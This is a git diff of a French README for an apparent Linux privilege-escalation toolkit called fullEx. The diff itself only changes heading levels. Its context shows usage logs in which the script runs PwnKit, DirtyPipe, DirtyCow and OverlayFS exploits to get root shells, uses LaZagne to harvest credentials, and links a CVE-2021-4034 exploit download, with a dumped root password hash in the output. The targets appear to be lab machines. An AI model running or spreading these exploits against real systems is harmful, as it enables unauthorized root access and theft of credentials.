@@ -15,9 +15,9 @@ Les exploits root & outils dispo :
 
 👾 LaZagne
 
-# ⚙️ Commandes
+## 🛠️ Commandes
 
-Pour rendre executable fullEx.sh , faire un -perm sur tout le dossier
+Pour rendre executable fullEx.sh ,faire un -perm sur tout le dossier
 
 ```
 vagrant@metasploitable3-ub1404:~/fullEx$ bash fullEx.sh -perm
@@ -48,7 +48,7 @@ Commands:
    -perm          Applique les droit d'execution '/fullEx'
    -help          Affiche les commandes
  ```
-# 🤖 LinPeas
+## 🤖 LinPeas
 
 ```
 www-data@Milburg-High:/tmp/fullEx$ bash fullEx.sh -perm
@@ -65,7 +65,7 @@ www-data@Milburg-High:/tmp/fullEx$ ./fullEx.sh -LinPeas
    Download URL: https://codeload.github.com/berdav/CVE-2021-4034/zip/main
 ```
 
-# 👾 LaZagne
+## 👾 LaZagne
 
 ```
 root@Milburg-High:/tmp/fullEx# ./fullEx.sh -LaZagne
@@ -113,7 +113,7 @@ elapsed time = 9.25296401978
 
 ```
 
-# 💀 PwnKit
+## 💀 PwnKit
 
 ```
 www-data@Milburg-High:/tmp/fullEx$ ./fullEx.sh -PwnKit64
@@ -121,7 +121,7 @@ www-data@Milburg-High:/tmp/fullEx$ ./fullEx.sh -PwnKit64
 root@Milburg-High:/tmp/fullEx#
 ```
 
-# 💀 DirtyPipe
+## 💀 DirtyPipe
 
 ```
 www-data@university:/tmp/fullEx$ ./fullEx.sh -DirtyPipe
@@ -141,7 +141,7 @@ www-data@university:/tmp/fullEx$ ./fullEx.sh -DirtyPipe
 [Dirty Pipe] Program execution completed successfully.
 root:$6$9WETWbCBTQ8pxg4I$odZAx8iIlayCnFdUwDM5dHVfsXXZo1RHRp2a4uQzcPDkRiTJYLA4loZESihn4ASGhWKN9.RWPT.CZJdyfTej4/:0:0:root:/root:/bin/sh
 ```
-# 💀 DirtyCow
+## 💀 DirtyCow
 
 ```
 www-data@ubuntu:/tmp/fullEx$ ./fullEx.sh -DirtyCow
@@ -184,7 +184,7 @@ id
 uid=0(firefart) gid=0(root) groups=0(root)
 ```
 
-# 💀 OverlayFS
+## 💀 OverlayFS
 
 ```
 www-data@droopy:/tmp/fullEx$ ./fullEx.sh -Overlays
